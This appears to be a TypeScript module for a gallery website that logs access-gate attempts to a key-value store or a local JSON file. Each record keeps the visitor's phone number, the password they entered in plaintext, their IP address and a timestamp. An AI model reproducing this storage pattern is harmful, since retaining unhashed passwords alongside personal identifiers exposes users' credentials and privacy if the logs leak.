import { kvGetJson, kvSetJson, isKvAvailable } from "./kv-adapter";
import { promises as fs } from "fs";
import path from "path";

const GATE_LOG_FILE = path.join(process.cwd(), "lib", "data", "gate-logs.json");
const KV_KEY = "luxury_gallery:gate_logs";

export interface GateLogEntry {
  id: string;
  phone: string;
  password: string;
  ip: string;
  date: string; // ISO date YYYY-MM-DD
  timestamp: string; // ISO full
  gallery: string;
}

function randomId(): string {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 9);
}

async function readLogs(): Promise<GateLogEntry[]> {
  const kvVal = await kvGetJson<unknown>(KV_KEY);
  if (Array.isArray(kvVal)) return kvVal as GateLogEntry[];
  try {
    const data = await fs.readFile(GATE_LOG_FILE, "utf-8");
    const parsed = JSON.parse(data);
    if (!Array.isArray(parsed)) return [];
    if (await isKvAvailable()) await kvSetJson(KV_KEY, parsed);
    return parsed;
  } catch {
    return [];
  }
}

async function writeLogs(entries: GateLogEntry[]): Promise<void> {
  if (await isKvAvailable()) {
    await kvSetJson(KV_KEY, entries);
    return;
  }
  const dir = path.dirname(GATE_LOG_FILE);
  await fs.mkdir(dir, { recursive: true });
  await fs.writeFile(GATE_LOG_FILE, JSON.stringify(entries, null, 2), "utf-8");
}

export async function addGateLog(params: {
  phone: string;
  password: string;
  ip: string;
  gallery: string;
}): Promise<void> {
  const now = new Date();
  const date = now.toISOString().slice(0, 10);
  const entry: GateLogEntry = {
    id: randomId(),
    phone: params.phone.replace(/\D/g, ""),
    password: params.password,
    ip: params.ip || "—",
    date,
    timestamp: now.toISOString(),
    gallery: params.gallery,
  };
  const entries = await readLogs();
  entries.push(entry);
  await writeLogs(entries);
}

export async function getAllGateLogs(): Promise<GateLogEntry[]> {
  const entries = await readLogs();
  return entries.sort(
    (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );
}
